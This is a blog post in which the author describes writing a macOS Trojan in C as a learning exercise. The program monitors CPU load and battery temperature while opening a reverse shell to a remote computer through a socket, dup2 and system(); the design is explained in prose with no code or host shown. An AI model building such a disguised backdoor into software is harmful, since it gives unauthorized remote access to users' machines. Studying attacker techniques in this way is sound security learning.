This program was inspired by the saying I sometimes hear that "Macs don't get viruses". I wanted to find out what it's like to write malware, which factors you have to consider, what way of thinking is required. I think that doing so and temporarily roleplaying as an attacker puts you in a better position to defend against threats.

I also wanted to learn a programming language that isn't also a shell language. I did some research and ended up picking C. I had a lot of reasons for this, but what stood out to me were 2 things:

* the amount of malware and exploits written in C
* the amount of IoT (Internet of Things) written in C

To me, this was killing two giant birds with one stone. That stone ended up being a lot bigger and heavier than I anticipated, but still. My goal was to write a program that resembles a Trojan - in this case, one that monitors a Mac's battery temperature and CPU usage while attempting to grant backdoor access to another machine.

Note: I won't (and you shouldn't) use this program as an actual Trojan or as malware in general such as using this program to gain access to a machine whos owner hasn't explicitly given permission to do so. I've written this program and this post to learn more and to talk about what that learning has been like for me, *nothing else*. You shouldn't let anyone run this program if that person doesn't fully understand what it does and hasn't given explicit permission for access through a reverse shell.

## The main() function

I start off by making sure the program is executed the right way: being run in the background. If it's not, it prints usage instructions. I check this in the same way I did in my [network monitor written in Bash](https://holstrater.github.io/dlp.sh/), which may also be suboptimal in C. Since checking if the current program is being run in the background seems like a valuable thing to master in general, I'll look for improvements regarding this later on. I then print a brief introduction to the user, noting that the Terminal application should not be completely closed to keep the program from exiting, although minimizing it is fine.

The program then calls three different functions and waits for 35 seconds. After that, the three functions are called again, waiting for 35 seconds again, infinitely repeating this in a loop.

## The check_cpu() function

The first function that is called and executed, monitors and reports about current CPU usage of the user's machine. It does this by issuing a command that checks kernel stats, in this case `vm.loadavg`. It does some filtering on these stats, making sure to only store the relevant part in the `.txt` file.

After that, some variables are initialized, making sure that the contents of the `.txt` file can be stored in an actual variable. After converting the variable content to the `int` type, the content is evaluated in a few `if` statements. This way, if the current CPU usage (stored in the variable) matches certain criteria, a temporary alert pops up informing the user of what's going on. Since high CPU usage is generally fine (especially on modern CPUs), I decided to keep the criteria rather strict. Doing otherwise could ruin the user experience if the alerts are interpreted as false positives. This could lead to the user shutting down the program entirely.

Since there's a considerable `sleep` being executed in the main loop, I didn't want the `.txt` to just sit there and do nothing for such a long time so I delete it each time `check_cpu()` ends.

## The check_bat() function

The second function does the same thing as the previous function, but instead of CPU usage it monitors and reports about current battery temperature of the user's machine. Instead of `sysctl` it uses `ioreg` which is able to query the required information. I did some research on the way the specific type of battery in Macs reacts to heat, on which I then based my criteria in the `if` statements.

Note: the numbers in these `if` statements are Celsius multiplied by 100 because that's how they're measured by `ioreg`, but this multiplication is obviously accounted for in the alerts shown to the user.

## The rev() function

The third function is the part where the program attempts to establish a connection with a remote computer, giving that computer shell access. It does this by creating a stream socket (used for the TCP protocol) that uses an IPv4 address, that is then used to connect to the data stored in the `socket_address` struct.

Next, a number of backup variables are created. These will be used later in this function to restore `stdin`, `stdout` and `stderr` as the program continues. This is needed because in the following lines, the `dup2()` function is used to direct `stdin`, `stdout` and `stderr` to the newly created socket. The result is that all input, output and errors will no longer be shown to the screen, but to the screen of whoever catches the reverse shell in the next lines. This is necessary for this particular method of a reverse shell in C.

I use `system()` for the reverse shell because I had some issues with properly returning from `execv()` which was my first option. Using `system()` means the program will go into a blocking mode as long as the reverse shell is active, which creates the small downside of the CPU and battery monitoring being paused while the reverse shell is active. However, since the reverse shell is this program's primary purpose anyway, it's not that bad. Besides, the program is lightweight so running it shouldn't significantly be increasing any of the measured values.

Once the `system()` function exits (either because no listener was active or because the listener cancelled the shell), it's important to properly clean up with regards to the newly created socket, `stdin`, `stdout` and `stderr`. I close the socket, restore `stdin`, `stdout` and `stderr` from the backup variables I created earlier and close them.  

## Final words

I learned a lot about the C language creating this program, but not completely the way I intended. C, for me, isn't the kind of language that you can pick up easily just by *doing*. Since it's such a low-level language with in my opinion not very intuitive syntax, it benefits a lot from creating a steady foundation with several books. Otherwise, you might end up with crucial gaps in your knowledge that will pretty much follow you forever.

Nevertheless, I did end up with a program that I think is very interesting, particularly in its combination of "good" (monitoring hardware stats) and "bad" (setting up backdoor access).

Also: I've been working on my multithreading skills/knowledge on the side while writing `maccheck.c`, so keep an eye out for a C program related to that in the future. In the meantime though, I have some reading to do. If you have any suggestions, questions or comments in general, let me know. They're more than welcome.
